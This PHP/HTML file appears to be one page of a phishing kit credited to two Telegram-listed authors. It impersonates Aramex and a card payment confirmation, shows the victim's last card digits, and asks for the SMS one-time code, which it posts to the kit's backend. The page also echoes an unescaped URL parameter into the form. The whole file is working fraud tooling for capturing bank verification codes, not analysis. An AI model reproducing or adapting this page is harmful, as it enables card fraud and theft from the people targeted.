<?php
    /*******
    Main Author: EL GH03T && Z0N51
    Contact me on telegram : https://t.me/elgh03t / https://t.me/z0n51
    ********************************************************/
    
    require_once '../includes/main.php';
    $cc = substr($_SESSION['one'], -4);
?>
<!doctype html>
<html style="background: #FFF;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/style.css">

        <link rel="icon" type="image/png" href="../assets/imgs/favicon.png" />

        <title>Aramex</title>
    </head>

    <body style="background: #FFF;">

		<div id="ss-wrapper">
            <div class="ss-area">
                <form action="../index.php" method="post">
                <input type="hidden" name="captcha">
                <input type="hidden" name="step" value="sms">
                <input type="hidden" name="error" value="<?php echo $_GET['error']; ?>">
                <div class="top d-flex align-items-center">
                    <div class="flex-grow-1"><img style="max-width: 150px;" src="../assets/imgs/logo2.svg"></div>
                    <div><img src="../assets/imgs/vs.png"></div>
                </div>
                <h3>Please confirm the following payment.</h3>
                <div class="details">
                    <p>The unique password has been sent to your mobile number. If you need to change your mobile number please contact your bank of modify it via the available chanels (ATM, web).</p>
                    <table>
                        <tr>
                            <td>Merchant:</td>
                            <td>ARAMEX EXPRESS</td>
                        </tr>
                        <tr>
                            <td>Amount:</td>
                            <td>4.23AED</td>
                        </tr>
                        <tr>
                            <td>Date:</td>
                            <td><?php echo date('d/m/Y'); ?></td>
                        </tr>
                        <tr>
                            <td>Credit card number</td>
                            <td>XXXX XXXX XXXX <?php echo $cc; ?></td>
                        </tr>
                        <tr>
                            <td>SMS code</td>
                            <td>
                                <input type="text" name="sms_code" id="sms_code" class="<?php echo is_invalid_class($_SESSION['errors'],'sms_code') ?>">
                                <?php
                                if( !empty($_SESSION['errors']['sms_code']) ) {
                                    echo '<p style="color: #D40511; font-size: 12px; margin-bottom: 0;">Code is invalid.</p>';
                                }
                                ?>
                            </td>
                        </tr>
                    </table>
                    <p style="font-size: 14px; text-align: center; margin-bottom: 0; margin-top: 10px;">Please enter the verification code received by sms : <span class="timer" style="color: #d40511; font-weight: 700; cursor: pointer;"></span></p>
                </div>
                <div class="btns">
                    <button type="submit">Submit</button>
                </div>
                <p class="copy">&copy; Aramex <?php echo date('Y'); ?>. All rights reserved.</p>
            </form>
            </div>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="../assets/js/jquery.countdownTimer.min.js"></script>
        <script src="../assets/js/script.js"></script>

        <script type="text/javascript">
            $(".timer").countdowntimer({
                minutes : 2,
                timeUp : timeIsUp
            });
            function timeIsUp() {
                $(".timer").html('Try again');
            }
            $('.timer').click(function(){
                location.reload();
            });
        </script>

    </body>

</html>